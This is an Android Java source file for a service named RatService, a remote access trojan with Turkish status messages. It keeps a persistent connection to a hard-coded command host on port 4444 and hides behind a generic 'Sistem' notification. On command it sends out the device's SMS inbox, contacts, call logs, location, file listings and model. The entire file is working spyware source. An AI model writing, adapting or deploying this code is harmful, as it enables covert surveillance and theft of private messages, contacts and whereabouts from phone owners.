package com.test.app;
import android.app.*;
import android.content.*;
import android.database.Cursor;
import android.location.*;
import android.os.*;
import android.provider.*;
import java.io.*;
import java.net.*;

public class RatService extends Service {
    Socket socket; PrintWriter out; BufferedReader in;
    private static final String IP = "192.168.1.177";
    private static final int PORT = 4444;

    @Override
    public int onStartCommand(Intent intent, int f, int s) {
        startForeground(1, notif());
        new Thread(this::connect).start();
        return START_STICKY;
    }

    private void connect() {
        while (true) {
            try {
                socket = new Socket(IP, PORT);
                out = new PrintWriter(socket.getOutputStream(), true);
                in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                out.println("BAGLANDI:" + Build.MODEL);
                String cmd;
                while ((cmd = in.readLine()) != null) {
                    try { handle(cmd.trim()); } catch (Exception e) { out.println("HATA:" + e); }
                }
            } catch (Exception e) {
                try { Thread.sleep(5000); } catch (InterruptedException ie) {}
            }
        }
    }

    private void handle(String cmd) throws Exception {
        switch (cmd) {
            case "sms": out.println(dumpSms()); break;
            case "contacts": out.println(dumpContacts()); break;
            case "calls": out.println(dumpCalls()); break;
            case "loc": out.println(getLoc()); break;
            case "files": out.println(listFiles("/sdcard")); break;
            case "device": out.println("Model: " + Build.MODEL); break;
            default: out.println("BILINMEYEN:" + cmd);
        }
    }

    private String dumpSms() {
        StringBuilder sb = new StringBuilder("=== SMS ===\n");
        Cursor c = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT 50");
        if (c != null) { while (c.moveToNext()) { sb.append(c.getString(c.getColumnIndexOrThrow("address"))).append(": ").append(c.getString(c.getColumnIndexOrThrow("body"))).append("\n"); } c.close(); }
        return sb.toString();
    }

    private String dumpContacts() {
        StringBuilder sb = new StringBuilder("=== KISILER ===\n");
        Cursor c = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        if (c != null) { while (c.moveToNext()) { sb.append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))).append(": ").append(c.getString(c.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n"); } c.close(); }
        return sb.toString();
    }

    private String dumpCalls() {
        StringBuilder sb = new StringBuilder("=== ARAMALAR ===\n");
        Cursor c = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT 50");
        if (c != null) { while (c.moveToNext()) { sb.append(c.getString(c.getColumnIndexOrThrow(CallLog.Calls.NUMBER))).append("\n"); } c.close(); }
        return sb.toString();
    }

    private String getLoc() {
        try {
            LocationManager lm = (LocationManager) getSystemService(LOCATION_SERVICE);
            Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            return loc == null ? "Konum yok" : "Enlem: " + loc.getLatitude() + " Boylam: " + loc.getLongitude();
        } catch (Exception e) { return "Konum hatasi"; }
    }

    private String listFiles(String path) {
        StringBuilder sb = new StringBuilder("=== DOSYALAR ===\n");
        File[] files = new File(path).listFiles();
        if (files != null) for (File f : files) sb.append(f.getName()).append("\n");
        return sb.toString();
    }

    private Notification notif() {
        String ch = "c";
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel nc = new NotificationChannel(ch, "S", NotificationManager.IMPORTANCE_LOW);
            getSystemService(NotificationManager.class).createNotificationChannel(nc);
        }
        return new Notification.Builder(this, ch).setContentTitle("Sistem").setContentText("Calisiyor").setSmallIcon(android.R.drawable.ic_menu_info_details).build();
    }
    @Override public IBinder onBind(Intent i) { return null; }
          }
